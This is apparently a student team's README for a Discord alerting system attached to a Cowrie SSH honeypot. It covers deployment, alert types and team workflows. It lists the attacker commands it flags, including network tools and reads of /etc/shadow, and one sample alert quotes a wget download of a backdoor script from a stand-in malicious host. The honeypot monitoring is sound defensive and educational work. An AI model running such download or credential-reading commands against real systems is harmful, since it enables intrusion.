# CerberusMesh Discord Monitoring System

## 🍯 Real-Time Honeypot Alerts for AIT670 Team Project

This enhanced monitoring system provides instant Discord notifications when attackers interact with your Cowrie honeypot, complete with threat intelligence, session tracking, and PCAP conversion capabilities.

## ⚡ Quick Start

### 1. Create Discord Webhook
- Go to your Discord server → Channel settings → Integrations → Create Webhook
- Copy the webhook URL (keep it secret!)

### 2. Deploy Enhanced Monitor
```bash
# Upload deployment scripts to your AWS honeypot
scp -i ~/.ssh/gmu-honeypot-key.pem 02-Deployment-Scripts/* ubuntu@3.140.96.146:~/

# SSH to honeypot and deploy enhanced system
ssh -i ~/.ssh/gmu-honeypot-key.pem ubuntu@3.140.96.146
chmod +x deploy_enhanced_discord_monitor.sh
sudo ./deploy_enhanced_discord_monitor.sh
```

### 3. Enhanced Features Automatically Configured
The enhanced deployment script automatically:
- ✅ Creates comprehensive monitoring with threat detection
- ✅ Sets up PCAP conversion capabilities  
- ✅ Configures team collaboration features
- ✅ Implements rate limiting and spam protection
- ✅ Creates management tools and utilities

### 4. Verify Deployment
```bash
# Check service status
sudo systemctl status cowrie-discord-monitor

# Test webhook connectivity  
cd /opt/cowrie/discord-monitor && python3 test_webhook.py

# View real-time logs
sudo journalctl -u cowrie-discord-monitor -f
```

## 🎯 Alert Types

| Alert | Color | Description | Action Required |
|-------|--------|-------------|-----------------|
| 🚨 **Successful Login** | Red | Attacker broke in! | **Immediate investigation** |
| 📤 **File Upload** | Red | Malware installation attempt | **Immediate analysis** |
| ⚠️ **Suspicious Command** | Orange | Interesting attacker behavior | Document techniques |
| 📥 **File Download** | Orange | Data theft attempt | Monitor activity |
| 🔒 **Failed Login** | Blue | Normal brute force | Track patterns |
| 💻 **Command Executed** | Blue | Basic system exploration | Optional review |

## 🛠️ Configuration

### Alert Levels (discord_config.json)
```json
{
  "alert_levels": {
    "login_success": true,     // 🚨 Critical - always enable
    "login_failed": false,     // Can be spammy
    "command_executed": true,  // Useful for analysis
    "file_upload": true,       // 🚨 Critical - always enable
    "file_download": true,     // Important for data theft detection
    "session_start": false,    // Usually too noisy
    "session_end": false       // Not usually needed
  }
}
```

### Interesting Commands
The system flags these commands as high-priority:
- **Reconnaissance**: `whoami`, `id`, `uname`, `ps`, `netstat`
- **Network Tools**: `wget`, `curl`, `nc`, `nmap`, `masscan`
- **Privilege Escalation**: `sudo`, `su`, `passwd`
- **System Access**: `cat /etc/passwd`, `cat /etc/shadow`
- **Persistence**: `crontab`, `systemctl`, `service`

## 📋 Team Workflows

### Discord Channel Setup
- **#honeypot-alerts** - All automated alerts
- **#honeypot-critical** - High-priority alerts only
- **#honeypot-discussion** - Team analysis and findings

### Response Procedures
1. **See an alert** → React with 👀 (acknowledged)
2. **Critical alert** → Investigate immediately
3. **Document findings** → Share in discussion channel
4. **Update threat database** → Record new attack patterns

## 🔧 Management Commands

```bash
# Service Management
sudo systemctl status cowrie-discord-monitor
sudo systemctl restart cowrie-discord-monitor
sudo journalctl -u cowrie-discord-monitor -f

# Testing
sudo -u cowrie python3 /opt/cowrie/discord-monitor/test_webhook.py

# Quick Setup (for team members)
./quick_setup_discord.sh

# Manual Start (for debugging)
sudo -u cowrie /opt/cowrie/discord-monitor/start_monitor.sh
```

## 🛡️ Security Features

- **Secure Configuration**: Webhook URLs stored with restricted permissions
- **User Isolation**: Runs as unprivileged `cowrie` user
- **Rate Limiting**: Prevents Discord API abuse
- **Log Rotation**: Automatic cleanup of old logs
- **Git Protection**: Webhook URLs excluded from version control

## 📊 Sample Alerts

### Successful Login Alert
```
🚨 SUCCESSFUL LOGIN DETECTED!
Attacker successfully logged in!

IP Address: 192.168.1.100
Username: admin
Password: admin123

Source IP: 192.168.1.100
Credentials: admin:admin123
```

### Suspicious Command Alert
```
⚠️ SUSPICIOUS COMMAND EXECUTED!
Command: wget http://malicious.com/backdoor.sh

Source IP: 192.168.1.100
Session: a1b2c3d4...

Command:
```bash
wget http://malicious.com/backdoor.sh
```
```

### File Upload Alert
```
📤 FILE UPLOAD DETECTED!
Attacker uploaded a file!

Filename: backdoor.py
Source IP: 192.168.1.100

Filename: backdoor.py
Source IP: 192.168.1.100
Action: Uploaded
```

## 🚀 Advanced Features

### Multiple Webhook Channels
```json
"notification_channels": {
  "general": "https://discord.com/api/webhooks/general-channel",
  "critical": "https://discord.com/api/webhooks/critical-channel"
}
```

### IP Filtering
```json
"high_priority_ips": ["known.bad.ip.1", "known.bad.ip.2"],
"ignored_ips": ["10.0.0.0/8", "internal.scanner.ip"]
```

## 🔍 Troubleshooting

### Common Issues

**No alerts appearing:**
```bash
# Check if Cowrie is logging
sudo tail -f /opt/cowrie/var/log/cowrie/cowrie.json

# Verify service is running
sudo systemctl status cowrie-discord-monitor
```

**Service won't start:**
```bash
# Check logs for errors
sudo journalctl -u cowrie-discord-monitor --no-pager

# Verify configuration
sudo -u cowrie python3 /opt/cowrie/discord-monitor/test_webhook.py
```

**Too many alerts:**
- Set `login_failed: false` in configuration
- Add noisy IPs to `ignored_ips`
- Increase `rate_limit_delay`

### Testing the System

Generate test activity:
```bash
# From another machine, try to connect
ssh -p 2222 admin@3.140.96.146

# Try common credentials:
# admin/admin, root/123456, ubuntu/ubuntu
```

## 📁 File Structure

```
02-Deployment-Scripts/
├── discord_honeypot_monitor.py    # Main monitoring script
├── discord_config_template.json   # Configuration template  
├── cowrie-discord-monitor.service # Systemd service
├── deploy_discord_monitor.sh      # Automated deployment
├── quick_setup_discord.sh         # Quick team setup
└── requirements.txt               # Python dependencies

03-Team-Tutorials/
└── Discord-Webhook-Setup.md       # Detailed team guide
```

## 🤝 Team Collaboration

### Best Practices
- Always acknowledge alerts with reactions
- Document interesting attack patterns
- Share webhook URLs securely (never in git/chat)
- Review alert rules weekly as a team
- Rotate webhook URLs monthly

### Daily Checklist
- [ ] Check for overnight alerts
- [ ] Verify monitoring service is running
- [ ] Review any critical incidents
- [ ] Update team on new attack patterns

---

**🎯 Happy Hunting!**  
*AIT670 Team Honeypot Project - Real-time threat detection for your cybersecurity education*